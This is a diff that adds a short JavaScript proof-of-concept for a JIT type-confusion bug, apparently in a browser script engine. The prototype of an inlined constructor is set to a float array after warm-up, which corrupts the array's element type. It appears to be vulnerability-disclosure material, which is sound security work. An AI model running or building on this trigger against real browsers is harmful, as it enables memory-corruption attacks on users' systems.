@@ -1,0 +1,32 @@
+/*
+This is similar to the previous issues 1457,  1459 (MSRC 42551, MSRC 42552).
+
+If a JavaScript function is used as a consturctor, it sets the new object's "__proto__" to its "prototype". The JIT compiler uses NewScObjectNoCtor instructions to perform it, but those instructions are not checked by CheckJsArrayKills which is used to validate the array information.
+
+PoC:
+*/
+
+function inlinee() {
+
+}
+
+function opt(arr) {
+    arr[0] = 1.1;
+    new inlinee();
+    arr[0] = 2.3023e-320;
+}
+
+function main() {
+    let arr = [1.1];
+    for (let i = 0; i < 10000; i++) {
+        inlinee.prototype = {};
+        opt(arr);
+    }
+
+    inlinee.prototype = arr;
+    opt(arr);
+
+    print(arr);
+}
+
+main();
